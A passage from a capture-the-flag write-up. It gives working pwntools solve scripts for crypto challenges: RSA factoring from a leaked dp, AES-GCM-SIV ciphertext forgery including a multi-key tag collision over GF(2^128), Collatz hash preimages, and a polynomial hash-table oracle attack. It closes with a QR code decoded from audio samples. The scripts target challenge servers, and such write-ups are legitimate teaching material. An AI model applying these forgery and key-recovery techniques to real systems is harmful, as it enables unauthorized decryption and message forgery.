    print("[*] STEP 2: Brute-forcing dp to find p...")
    for dp in candidates:
        # Check: a^(e*dp - 1) = 1 mod p
        # Calculate GCD(a^(e*dp - 1) - 1, N) to find p
        
        exponent = e * dp - 1
        
        # Base a = 2
        val = pow(2, exponent, N)
        
        p = math.gcd(val - 1, N)
        
        if p > 1 and p < N:
            print(f"\n[+] SUCCESS! Found dp: {dp}")
            print(f"[+] Found p: {str(p)[:30]}...")
            
            # --- DECRYPTION ---
            print("[*] STEP 3: Decrypting the flag...")
            q = N // p
            phi = (p - 1) * (q - 1)
            d = modinv(e, phi)
            
            m_int = pow(c, d, N)
            flag = long_to_bytes(m_int)
            
            print("-" * 40)
            try:
                print(f"FLAG: {flag.decode()}")
            except:
                print(f"FLAG (HEX): {flag.hex()}")
            print("-" * 40)
            return

if __name__ == "__main__":
    solve()
```
FLAG: `flag{w31n3r_d1dn7_73ll_y0u_70_b3_6r33dy}`

### Ambystoma Mexicanum

#### Description

The axolotl (Ambystoma mexicanum) is a species of paedomorphic mole salamander, meaning they mature without undergoing metamorphosis into the terrestrial adult form; the adults remain fully aquatic with obvious external gills.
 
#### Vulnerability

The server uses the [AES GCMSIV](https://eprint.iacr.org/2017/168.pdf) encryption system.

The exploitation point leading to the unintended solution is the following code segment:

```python
for i in range(4):
    key = binascii.unhexlify(KEYS[i % len(KEYS)])
    ct = binascii.unhexlify(CIPHERTEXTS[i % len(CIPHERTEXTS)])
```

* Using the modulo operation: If there's only 1 key, all 4 iterations use the same key, so we just need to use the first key to encrypt 4 plaintext blocks sequentially:

```python
block0 = b"gib me flag p" + b"   "   # 13 chars + 3 spaces
block1 = b"l" + b" " * 15
block2 = b"i" + b" " * 15
block3 = b"s" + b" " * 15
```

so that after decryption, they can be combined to form the target message.

#### Solve

```python
from pwn import *
import re
from cryptography.hazmat.primitives.ciphers.aead import AESGCMSIV

HOST = "remote.infoseciitr.in"   
PORT = 4004          

def main():
    r = remote(HOST, PORT)

    r.recvuntil(b"Your choice:")

    r.sendline(b"2")
    data = r.recvuntil(b"Your choice:").decode()


    key_match   = re.search(r"KEYS=\['([0-9a-f]+)'\]", data)
    nonce_match = re.search(r"nonce=([0-9a-f]+)", data)
    assert key_match and nonce_match, "Failed to parse key/nonce"

    key_hex   = key_match.group(1)
    nonce_hex = nonce_match.group(1)

    print(f"[+] Leaked key:   {key_hex}")
    print(f"[+] Leaked nonce: {nonce_hex}")

    key   = bytes.fromhex(key_hex)
    nonce = bytes.fromhex(nonce_hex)

    block0 = b"gib me flag p" + b"   "   # 13 chars + 3 spaces
    block1 = b"l" + b" " * 15
    block2 = b"i" + b" " * 15
    block3 = b"s" + b" " * 15
    P = block0 + block1 + block2 + block3
    assert len(P) == 64

    aead = AESGCMSIV(key)
    ct   = aead.encrypt(nonce, P, b"")
    ct_hex = ct.hex()
    print(f"[+] Forged ciphertext (hex): {ct_hex}")

    r.sendline(b"3")
    r.recvuntil(b"Enter ciphertext (hex):")
    r.sendline(ct_hex.encode())

    r.recvuntil(b"Your choice:")

    r.sendline(b"4")

    print(r.recvall().decode())

if __name__ == "__main__":
    main()

```
FLAG: `flag{th3_4x0lo7ls_4r3_n07_wh47_th3y_s33m}`


### Ambystoma Mexicanum Revenge

#### Description

The axolotls are not what they seem, they are back now, with a revenge.

#### Vulnerability

In this challenge, the author patched the unintended solution, forcing us to use 4 keys instead of just 1 like in the previous challenge to encrypt

```python
for i in range(4):
    try:
        key = binascii.unhexlify(KEYS[i])
        ct = binascii.unhexlify(CIPHERTEXTS[i % len(CIPHERTEXTS)])
```

This means the Server wants to use the same ciphertext ct for all 4 keys

When decrypting:

* Under key 0, block 0 → "gib m"
* Under key 1, block 1 → "e fla"
* Under key 2, block 2 → "g pli"
* Under key 3, block 3 → "s"

Decryption under all 4 keys must pass authentication (tag must be correct with POLYVAL for each key)
$$ tag = AES_{mek_j} (S_j \oplus(nonce||0^{32}) \ and \ MSB)$$
where:
* $S_j=POLYVALHj(AAD,plaintext,length block)$
* $nonce || 0^{32}=nonce || b"\x00\x00\x00\x00"$

Get 4 equations and get $S_j$

Then solve the system of equations in $GF(2^{128})$ to obtain the plaintext for every key

#### Solve

Choose option 1 three times to get 4 keys
Choose option 2 to get key, nonce leak
Then run the following script
```python
from Crypto.Cipher import AES
from Crypto.Util.strxor import strxor
import binascii, os, sys

# --------- FILL IN YOUR DEBUG INFO ----------

KEYS=['4a3384d96c2477580b3fd572108a3011', '56cbc2e00e4310981a768126c5aa0916', 'c3c9675f70b0a1c3e197b63bae8b23af', '1a63c6625cb03c957c8ec8ce39ba57ed']
CIPHERTEXTS=[]
nonce='b0369d1ca4dc211062666850'

KEYS_HEX=KEYS
CIPHERTEXTS=[]
NONCE_HEX= nonce

# ------------------------------------------------

keys  = [binascii.unhexlify(k) for k in KEYS_HEX]
nonce = binascii.unhexlify(NONCE_HEX)

# =========== GF(2^128) for POLYVAL ==============
R = PolynomialRing(GF(2), 'x')
x = R.gen()
POLYVAL_modulus = x**128 + x**127 + x**126 + x**121 + 1
K = GF(2**128, name='a', modulus=POLYVAL_modulus)

def bytes_to_bit_array(data):
    bits = []
    for b in data:
        s = bin(b)[2:].zfill(8)
        s = s[::-1]  # little-endian within byte (according to RFC 8452)
        bits.extend(int(bit) for bit in s)
    return bits

def bytes_to_fe(b):
    return K(bytes_to_bit_array(b))

def fe_to_bytes(fe):
    bits = list(fe)
    if len(bits) < 128:
        bits += [0]*(128-len(bits))
    out = bytearray()
    for i in range(0, 128, 8):
        chunk = bits[i:i+8]
        chunk.reverse()
        s = ''.join(str(bit) for bit in chunk)
        out.append(int(s, 2))
    return bytes(out)

def u64_le(i):
    return i.to_bytes(8, "little")

def length_block(aad_len, pt_len):
    # length in bits, little-endian as per RFC 8452
    return u64_le(aad_len * 8) + u64_le(pt_len * 8)

# =========== Key derivation AES-GCM-SIV =========

def derive_keys(master_key, nonce):
    """
    RFC 8452 derive_keys (AES-128).
    Returns (msg_auth_key, msg_enc_key).
    """
    assert len(master_key) in (16, 32)
    assert len(nonce) == 12
    cipher = AES.new(master_key, AES.MODE_ECB)
    blocks = []
    for ctr in range(4):
        blk = cipher.encrypt(ctr.to_bytes(4, "little") + nonce)
        blocks.append(blk)
    msg_auth_key = blocks[0][:8] + blocks[1][:8]
    msg_enc_key  = blocks[2][:8] + blocks[3][:8]
    return msg_auth_key, msg_enc_key

def check_polyval(msg_enc_key, nonce, tag):
    """
    From tag, recover S_s (POLYVAL output) like Malosdaf:
      tag = AES_Enc(mek, (S_s xor nonce||0^32) & 0x7f in MSB)
    """
    cipher = AES.new(msg_enc_key, AES.MODE_ECB)
    s = cipher.decrypt(tag)  # S_s' = S_s xor nonce||0^32, with MSB cleared
    if s[15] & 0x80:
        return False, None
    s = strxor(s, nonce + b"\x00"*4)  # S_s
    return True, s

# ========= Prepare plaintext for K[0] ==========
# Divide into 4 blocks of 16 bytes, each block .strip() then concatenate = "gib me flag plis"

b0 = b"gib m" + b" " * 11
b1 = b"e fla" + b" " * 11
b2 = b"g pli" + b" " * 11
b3 = b"s"     + b" " * 15

need_plaintext = b0 + b1 + b2 + b3
if len(need_plaintext) % 16 != 0:
    need_plaintext += b"\x00" * (16 - len(need_plaintext) % 16)

need_blocks = len(need_plaintext) // 16      # = 4
M = 4                                        # number of keys
S = M                                        # number of sacrificial blocks = M
num_blocks = need_blocks + S                 # total plaintext blocks under each key

# ======= Derive per-message keys for 4 keys =====

msg_auth_keys = []
msg_enc_keys  = []
for k in keys:
    mak, mek = derive_keys(k, nonce)
    msg_auth_keys.append(mak)
    msg_enc_keys.append(mek)

# ======= Choose common tag for all 4 keys =======

while True:
    tag = os.urandom(16)
    ok = True
    s_list = []
    for mek in msg_enc_keys:
        ok_tag, s = check_polyval(mek, nonce, tag)
        if not ok_tag:
            ok = False
            break
        s_list.append(s)
    if ok:
        break

# ======= Generate AES-CTR keystream for each key =====

counter = bytearray(tag)
counter[15] |= 0x80
counter = bytes(counter)

keystreams = [[] for _ in range(M)]
aes_objs = [AES.new(mek, AES.MODE_ECB) for mek in msg_enc_keys]

for _ in range(num_blocks):
    for j in range(M):
        ks = aes_objs[j].encrypt(counter)
        keystreams[j].append(ks)
    ctr_int = int.from_bytes(counter, "little") + 1
    counter = ctr_int.to_bytes(16, "little")

# ======= Prepare POLYVAL parameters =========

inv = bytes_to_fe(b"\x01" + b"\x00"*13 + b"\x04\x92")  # x^-128, according to RFC 8452
w = [bytes_to_fe(mak) * inv for mak in msg_auth_keys]   # H_j = msg_auth_key_j * x^-128

LENBLOCK_fe = bytes_to_fe(length_block(0, 16 * num_blocks))   # AAD = 0, plaintext = 16*num_blocks
aad_poly = [K(0)] * M  # no AAD

polyvals_rhs = []
for j in range(M):
    s_fe = bytes_to_fe(s_list[j])     # S_s^(j)
    polyvals_rhs.append(s_fe + w[j] * LENBLOCK_fe + aad_poly[j])

# ======= Build linear system A * X = b ===========
# Variable X contains M*num_blocks plaintext blocks:
#   key 0: P_0[0..num_blocks-1]
#   key 1: P_1[...]
#   key 2: ...
#   key 3: ...

matrix_size = M * num_blocks
rows = []
rhs  = []

# 1) POLYVAL equations: 1 equation per key
for j in range(M):
    row = [K(0)] * matrix_size
    # sum_i P_{j,i} * H_j^{num_blocks+1-i}
    for i in range(num_blocks):
        row[j * num_blocks + i] = w[j] ** (num_blocks + 1 - i)
    rows.append(row)
    rhs.append(polyvals_rhs[j])

# 2) Ciphertext equality equations:
#    C_i is the same for all keys => P_0[i] + P_j[i] = KS0[i] + KSj[i]
for i in range(num_blocks):
    ks0_fe = bytes_to_fe(keystreams[0][i])
    for j in range(1, M):
        row = [K(0)] * matrix_size
        row[0 * num_blocks + i] = K(1)
        row[j * num_blocks + i] = K(1)
        rows.append(row)
        rhs.append(ks0_fe + bytes_to_fe(keystreams[j][i]))

# 3) Fix plaintext for key 0, first 4 blocks
target_positions = [
    (0, 0),  # b0 for key0, block0
    (1, 1),  # b1 for key1, block1
    (2, 2),  # b2 for key2, block2
    (3, 3),  # b3 for key3, block3
]

for blk_idx, (j, blk) in enumerate(target_positions):
    row = [K(0)] * matrix_size
    row[j * num_blocks + blk] = K(1)
    rows.append(row)
    block_bytes = need_plaintext[16 * blk_idx : 16 * (blk_idx + 1)]
    rhs.append(bytes_to_fe(block_bytes))

assert len(rows) == matrix_size == len(rhs), "System is not square!"

A = Matrix(K, rows)
b_vec = vector(K, rhs)

print("[*] Solving linear system over GF(2^128)...")
X = A.solve_right(b_vec)

# ======= Construct ciphertext for key 0 ============

P0_blocks_fe = [X[i] for i in range(num_blocks)]

ct_blocks = []
for i in range(num_blocks):
    ks0_fe = bytes_to_fe(keystreams[0][i])
    ct_blocks.append(ks0_fe + P0_blocks_fe[i])  # C_i = KS0_i + P0_i

ct_bytes = b"".join(fe_to_bytes(c) for c in ct_blocks)
ciphertext_full = ct_bytes + tag

print("[*] Ciphertext length:", len(ciphertext_full))
print("[*] Ciphertext hex (paste into option 3):")
print(binascii.hexlify(ciphertext_full).decode())
```

Choose option 3 to submit the obtained ciphertext
Choose option 4 to get the flag


FLAG: `flag{4x0l075_0nly_5p4wn_1n_lu5h_c4v35_0r_1n_7h3_d4rk}`



### p34kC0nj3c7ur3

#### Description

Pave your path to ultimate hash function!

#### Analysis

This is the [3n + 1 - Collatz ](https://en.wikipedia.org/wiki/Collatz_conjecture) problem in the form of a hash function

The server computes `myHash = uniqueHash(message)` and we are given `uniqueHash(myHash)`

We must find 10 values such that H(i) = myHash

#### Exploit Idea

First, we need to find the value of myHash

The server returns H(myHash) = 25, we can search from 1 to 10000 to find which number has 25 steps, and then we can determine myHash = 4017

Then, by simply reversing the operations x * 2 and (x-1)/3 from 1, we will trace back 10 numbers that have 4017 steps to reach 1

#### Solve

```python
from pwn import *
from Crypto.Util.number import isPrime
import random
import time

# --- Configuration ---
HOST = 'remote.infoseciitr.in'
PORT = 4002
MY_HASH_TARGET = 4017 # Found from leak analysis step (uniqueHash(4017) -> 25)

# --- Helper Functions ---
def get_preimage_batch(target_steps, batch_size=8000):
    """
    Generate numbers with stopping time equal to target_steps by reversing Collatz.
    Use large batch_size to increase chances of finding prime numbers at deeper levels.
    """
    # Start reversing from number 1
    current_layer = {1}

    # Loop to go back target_steps - 1 steps
    for i in range(target_steps - 1):
        next_layer = set()
        
        # Optimization: Keep population size stable to avoid RAM overflow
        parents = list(current_layer)
        if len(parents) > batch_size:
            parents = random.sample(parents, batch_size)
            
        for x in parents:
            # Reverse Rule 1: From division by 2 => multiply by 2
            next_layer.add(x * 2)

            # Reverse Rule 2: From 3x+1 => (x-1)/3
            if (x - 1) % 3 == 0:
                prev = (x - 1) // 3
                # Forward Collatz condition: 3x+1 only applies to odd numbers
                if prev % 2 == 1 and prev > 1:
                    next_layer.add(prev)
        
        current_layer = next_layer
        if not current_layer:
            return [], []

    # Final step: Classify into Prime and Composite
    primes = []
    composites = []
    
    for x in current_layer:
        # Branch A: Multiply by 2 (Always composite since x > 1)
        composites.append(x * 2)
        
        # Branch B: (x-1)/3
        if (x - 1) % 3 == 0:
            prev = (x - 1) // 3
            if prev % 2 == 1 and prev > 1:
                if isPrime(prev):
                    primes.append(prev)
                else:
                    composites.append(prev)
                    
    return primes, composites

def solve():
    context.log_level = 'info'
    
    # 1. PRE-COMPUTE: Calculate offline beforehand to avoid timeout
    # Need to find at least 10 numbers, take 15 extra to be sure
    primes_pool = set() 
    composites_pool = set()
    
    log.info(f"Target Hash: {MY_HASH_TARGET}. Finding at least 15 Prime numbers...")
    
    attempt = 1
    # Generate loop until enough Primes are collected
    while len(primes_pool) < 15:
        log.info(f"Batch {attempt}: Generating (current primes count: {len(primes_pool)})...")
        p, c = get_preimage_batch(MY_HASH_TARGET, batch_size=8000)
        primes_pool.update(p)
        composites_pool.update(c)
        attempt += 1
        
    # Convert to list to use pop() function
    primes_pool = list(primes_pool)
    composites_pool = list(composites_pool)
    
    log.success(f"Ready! Found {len(primes_pool)} Primes and {len(composites_pool)} Composites.")

    # 2. CONNECT: Now connect to server
    conn = remote(HOST, PORT)

    # 3. VERIFY LEAK
    conn.recvuntil(b"This is my hash of hash: ")
    leak = int(conn.recvline().strip())
    log.info(f"Leak from server: {leak}")
    
    proofs_needed = 10
    
    # Based on "Well Well" error analysis from previous run, we know Flag is Prime
    target_is_prime = True
    log.info("Locked Target Type: PRIME (Based on previous analysis)")
    
    while proofs_needed > 0:
        candidate = None
        
        if target_is_prime:
            if not primes_pool:
                log.error("Ran out of Prime numbers to send! Need to increase batch_size or run again.")
                return
            candidate = primes_pool.pop()
        else:
            if not composites_pool:
                log.error("Ran out of Composite numbers!")
                return
            candidate = composites_pool.pop()

        # Send number to server
        log.info(f"Sending number (Is Prime? {isPrime(candidate)})...")
        conn.recvuntil(b"Enter your message in hex: ")
        conn.sendline(hex(candidate).encode())
        
        # Read response
        try:
            response = conn.recvline().decode().strip()
            log.info(f"Server response: {response}")
        except EOFError:
            log.error("Server closed connection unexpectedly.")
            return

        if "Incorrect!" in response:
            log.error("Incorrect hash! Logic calculation has issues.")
            return
            
        elif "Correct!" in response:
            proofs_needed -= 1
            log.success(f"Correct! {proofs_needed} remaining.")
                
        elif "Well Well" in response:
            # Backup case, if guessed wrong Prime/Composite type
            log.warning("Wrong prime property! Changing target...")
            target_is_prime = not target_is_prime

    # Get Flag
    conn.interactive()

if __name__ == "__main__":
    solve()
```

FLAG: `flag{1r0n_m4n_f0r_c0ll4tz_3ndg4m3_0f_cryp70gr4phy_1s_p34k_r16h7_313}`

### The job

Your non cryptography "friend" needs your help or he might lose his job. Well you don't really care you just want the flag don't you.

Anyways connect to the instance to get the flag... after helping your friend save his job ofcourse.

#### Analysis

Hash table has `k = 256` slots, each slot can contain multiple elements

The hash function is defined as:
```
def get_hash(num, coeff_arr):
    hash = 0
    mult = 1
    for i in range(len(coeff_arr)):
        hash = (hash + mult * coeff_arr[len(coeff_arr)-1-i]) % mod
        mult = (mult * num) % mod
    return hash
```

This calculates $H_i(x) = c_0 + c_1x_i + c_2x_i^2 + ... + c_nx_i^n \ mod \ p$, such that $H_i(x) < 256$

The challenge has 2 phases:

* Phase 1

```
for i in range(k):
    if len(hash_table[i]) > (n + k - 1)/k:
        fail
```

We need to choose polynomial coefficients such that each **hash_table[i]** contains no more than 4 elements

* Phase 2
Similar to phase 1, but one slot of **hash_table[i]** has been added with **junk**, we have to guess which slot number it is

#### Exploitation StrategyChallenge

* Phase 1

We need to choose a polynomial function such that **hash_table[i]** contains no more than 4 elements

One strategy is to pre-select `hash_table(H(x)) = x`

Then hashtable = [[x1, x2, x3, x4], [x5, x6, x7, x8], ...,[0,0,0,0]]

From 896 pairs (x, y), we will use [Lagrange interpolation](https://vuontoanblog.blogspot.com/2012/10/polynomial-interpolation-lagrange.html) to get the polynomial coefficients, input them to the server to automatically pass phase 1

* Phase 2

The server will pre-select 1 slot in hash_table and add junk to it, we need to find the index

The strategy is to divide hash_table into 2 halves, the first half has 128 slots with 4 elements, the rest with 3 elements

If server returns pass -> junk is in the second half
If server returns fail -> junk is in the first half

The idea repeats when we find the index range where junk is located, similar to binary search

#### Solve

Run the script below until you get the flag

```python
from pwn import *
import sys

MOD = 10**9 + 7
K = 256
N = 896

# ---------- Polynomial helpers ----------

def poly_add(A, B, p):
    n = max(len(A), len(B))
    res = [0] * n
    for i in range(n):
        if i < len(A):
            res[i] = (res[i] + A[i]) % p
        if i < len(B):
            res[i] = (res[i] + B[i]) % p
    # trim highest-degree zeros
    while len(res) > 1 and res[-1] == 0:
        res.pop()
    return res

def poly_scal_mul(A, s, p):
    return [(a * s) % p for a in A]

def poly_mul_linear(A, c0, c1, p):
    """
    Return A(x) * (c0 + c1*x).
    """
    res = [0] * (len(A) + 1)
    for i, a in enumerate(A):
        res[i]     = (res[i] + a * c0) % p
        res[i + 1] = (res[i + 1] + a * c1) % p
    # trim
    while len(res) > 1 and res[-1] == 0:
        res.pop()
    return res

def poly_eval(A, x, p):
    """
    Evaluate polynomial A (low-degree first) at x using Horner.
    """
    res = 0
    for coef in reversed(A):
        res = (res * x + coef) % p
    return res

def interpolate(xs, ys, p=MOD):
    """
    Given distinct xs and arbitrary ys, return polynomial P
    (low-degree first) of degree < len(xs) such that P(xs[i]) = ys[i].
    """
    P = [0]   # current polynomial
    Q = [1]   # product (x - x_j) over previous points
    for x_i, y_i in zip(xs, ys):
        x_i %= p
        y_i %= p
        valP = poly_eval(P, x_i, p)
        valQ = poly_eval(Q, x_i, p)
        invQ = pow(valQ, p - 2, p)   # Fermat inverse
        a = (y_i - valP) * invQ % p
        P = poly_add(P, poly_scal_mul(Q, a, p), p)
        Q = poly_mul_linear(Q, (-x_i) % p, 1, p)  # Q *= (x - x_i)
    return P

def coeffs_for_server(P, mod=MOD):
    """
    Convert low-degree-first polynomial P to the coefficient
    string expected by server.get_hash (highest degree first).
    """
    arr = [c % mod for c in reversed(P)]
    # strip leading zeros if any
    i = 0
    while i < len(arr) - 1 and arr[i] == 0:
        i += 1
    arr = arr[i:]
    return ",".join(str(c) for c in arr)

# ---------- build connection and solve ----------

def main():
    io = remote("remote.infoseciitr.in", 4006)

    # ---- Stage 0: get leaked numbers ----
    io.recvuntil(b"Press Enter to start > ")
    io.sendline(b"")
    line = io.recvline().decode().strip()
    # should be: "Here are the leaked numbers : a,b,c,..."
    assert "Here are the leaked numbers" in line
    nums_str = line.split(":", 1)[1].strip()
    xs = list(map(int, nums_str.split(",")))
    assert len(xs) == N

    # ---- Stage 1: build polynomial with <=4 per bucket ----
    # simple pattern: 4 per bucket for 0..223, rest empty
    ys0 = [i // 4 for i in range(N)]  # 0..223 each repeated 4 times
    P0 = interpolate(xs, ys0, MOD)
    coeff_str0 = coeffs_for_server(P0, MOD)

    io.recvuntil(b"> ")  # "Enter the coefficients..." prompt
    io.sendline(coeff_str0.encode())

    # skip messages until the "Press Enter to continue > " prompt
    io.recvuntil(b"Press Enter to continue > ")
    io.sendline(b"")

    # ---- Stage 2: 6 trials to learn bits 0..5 of target ----
    # Precompute subsets S_t = { i | bit t of i is 1 }
    S = []
    for t in range(6):
        S_t = {i for i in range(K) if (i >> t) & 1}
        assert len(S_t) == 128
        S.append(S_t)

    bits = []  # bits[t] = 1 if target in S_t, else 0

    for t in range(6):
        # Receive "Trial X" prompt & "Enter coeffs" prompt
        io.recvuntil(b"Trial ")
        io.recvline()  # e.g. "1 : "
        io.recvuntil(b"> ")

        # Build mapping for this trial: 4 on S_t, 3 on complement
        big = [i for i in range(K) if i in S[t]]
        small = [i for i in range(K) if i not in S[t]]
        assert len(big) == 128 and len(small) == 128

        ys = [0] * N
        pos = 0
        # assign 4 values to each big bucket
        for idx in big:
            for _ in range(4):
                ys[pos] = idx
                pos += 1
        # assign 3 values to each small bucket
        for idx in small:
            for _ in range(3):
                ys[pos] = idx
                pos += 1
        assert pos == N

        P_t = interpolate(xs, ys, MOD)
        coeff_str_t = coeffs_for_server(P_t, MOD)
        io.sendline(coeff_str_t.encode())

        # Read manager's verdict
        io.recvuntil(b"Manager says the hash ")
        res = io.recvline().decode()
        # extra blank line after that
        # (string has "\n\n") – consume one extra line safely
        try:
            io.recvline(timeout=0.1)
        except:
            pass

        if "passed" in res:
            bits.append(0)  # target not in S_t
        else:
            bits.append(1)  # target in S_t

    # ---- Deduce candidate indices and guess ----
    candidates = []
    for idx in range(K):
        ok = True
        for t in range(6):
            in_set = idx in S[t]
            if bits[t] == 1 and not in_set:
                ok = False
                break
            if bits[t] == 0 and in_set:
                ok = False
                break
        if ok:
            candidates.append(idx)

    print("Bits learned:", bits, "candidates:", candidates, file=sys.stderr)

    # There will be exactly 4 candidates; pick one (e.g. at random or first)
    guess = candidates[0]
    io.recvuntil(b"Tell your friend the index : ")
    io.sendline(str(guess).encode())

    # Show whatever the server prints (hopefully the flag)
    io.interactive()

if __name__ == "__main__":
    main()
```

FLAG: `flag{h0w_d1d_h3_b3c0m3_th3_m4n4g3r}`
## Steg/For
### Sonic

#### Description

We intercepted a strange audio transmission. Our audio analysts say it's not music, not speech, and definitely not random noise. Can you figure out what it is?

#### Analysis

##### Basic file inspection

First, inspect the audio file:

```bash
$ file challenge.wav
challenge.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, mono 44100 Hz
```

So we have:

- Mono
- 16‑bit PCM
- 44,100 Hz sample rate

Let’s look at the raw samples in Python:

```python
import wave
import numpy as np

w = wave.open("challenge.wav", "rb")
print(w.getnchannels(), w.getsampwidth(), w.getframerate(), w.getnframes())

frames = w.readframes(w.getnframes())
samples = np.frombuffer(frames, dtype="<i2")  # 16-bit little-endian
print(np.unique(samples))
```

Output is essentially:

- Channels: `1`
- Sample width: `2` bytes
- Sample rate: `44100`
- Unique sample values: `[-8000, 2700, 8000]`

So the “audio” isn’t voice or music; it’s a **discrete digital signal** using only three levels.

---

##### Finding the preamble

Check where the middle value `2700` appears:

```python
idx_2700 = np.where(samples == 2700)[0]
print(len(idx_2700), idx_2700[:20], idx_2700[-20:])
```

We see:

- Exactly **200** samples at value `2700`.
- They occupy indices `0`–`199`.

After that, the signal uses only `-8000` and `+8000`.

That strongly suggests the first 200 samples are a **preamble / sync sequence**. We can ignore them and work with the rest:

```python
samples2 = samples[200:]
```

---

##### Guessing the symbol length

A common trick is to use a nice round time unit like **10 ms** per symbol.

At 44.1 kHz:

```python
44100 * 0.01  # 10 ms
# 441.0
```

So 10 ms = 441 samples. Let’s see if the remaining data length is a multiple of 441:

```python
block_size = 441
nblocks = len(samples2) // block_size
print(nblocks, len(samples2) - nblocks * block_size)
```

We get:

- `nblocks = 729`
- Remainder = `0`

Perfect: after the preamble, the audio splits into **729 blocks of 441 samples** exactly.

So each block of 441 samples is one **symbol**.

---

##### Converting symbols to bits

For each 441-sample block, we can compute its average value and use the **sign** to determine a bit:

- Mean > 0 → bit `1`
- Mean ≤ 0 → bit `0`

```python
blocks = samples2.reshape(nblocks, block_size)
means = blocks.mean(axis=1)
bits = (means > 0).astype(int)

print(np.unique(bits, return_counts=True))
```

This gives:

- Bit values: `[0, 1]`
- Counts: e.g. `328` zeroes, `401` ones

So now we have a **729‑bit sequence**.

---

##### Bits → 2D grid

729 factors as:

```text
729 = 27 × 27
```

That’s a suspiciously nice size for a small **bitmap**.

Reshape into a 27×27 grid:

```python
grid = bits.reshape(27, 27)

def show_grid(g):
    return "\n".join(
        "".join("#" if b else " " for b in row)
        for row in g
    )

print(show_grid(grid))
```

The output looks like a 27×27 block with a solid border and structured patterns inside the border – clearly not random.

To check whether the colors are inverted, we flip 0↔1:

```python
inv_grid = 1 - grid
print(show_grid(inv_grid))
```

After inversion, we can see a quiet border and a structured pattern in the center that resembles a **QR code** (with finder patterns in three corners).

---

##### Extracting the QR core

QR codes come in specific sizes. For version *v*:

```text
size = 21 + 4 × (v - 1)
```

Sizes:
- v1 → 21×21
- v2 → 25×25
- v3 → 29×29
- …

We have a 27×27 grid. That suggests:

- 1-pixel border around
- Inner **25×25** core → matches **QR version 2**

So we extract the inner 25×25 region, stripping 1 row/column from each side:

```python
core = inv_grid[1:26, 1:26]
print(core.shape)   # (25, 25)
print(show_grid(core))
```

The resulting pattern has classic QR structures:

- Three large finder squares in three corners
- Timing patterns
- Data and error correction modules

So this is our QR code raster.

---

##### Rendering the QR as an image

Next, we render the `core` grid into an actual image (black / white pixels), scaled up to make scanning easy.

```python
from PIL import Image

scale = 10  # pixels per module
N = 25      # QR core size

img = Image.new("L", (N * scale, N * scale), 255)  # start all white
pixels = img.load()

for y in range(N):
    for x in range(N):
        color = 0 if core[y, x] == 1 else 255  # 1=black, 0=white
        for dy in range(scale):
            for dx in range(scale):
                pixels[x * scale + dx, y * scale + dy] = color

img.save("qr_raw.png")
```

QR scanners generally expect a **quiet zone** (white margin) around the code, typically 4 modules wide. We add that:

```python
quiet   = 4      # quiet zone width in modules
modsize = 10     # pixels per module
size    = (N + 2*quiet) * modsize

img2 = Image.new("L", (size, size), 255)
pix2 = img2.load()

for y in range(N):
    for x in range(N):
        color = 0 if core[y, x] == 1 else 255
        for dy in range(modsize):
            for dx in range(modsize):
                px = (x + quiet) * modsize + dx
                py = (y + quiet) * modsize + dy
                pix2[px, py] = color

img2.save("qr_with_quiet.png")
```

Now `qr_with_quiet.png` is a properly padded QR image.

![image](https://hackmd.io/_uploads/S1LNrnNfbg.png)

Final: `flag{p1x3l5_1n_4ud10_4r3_fun!}`
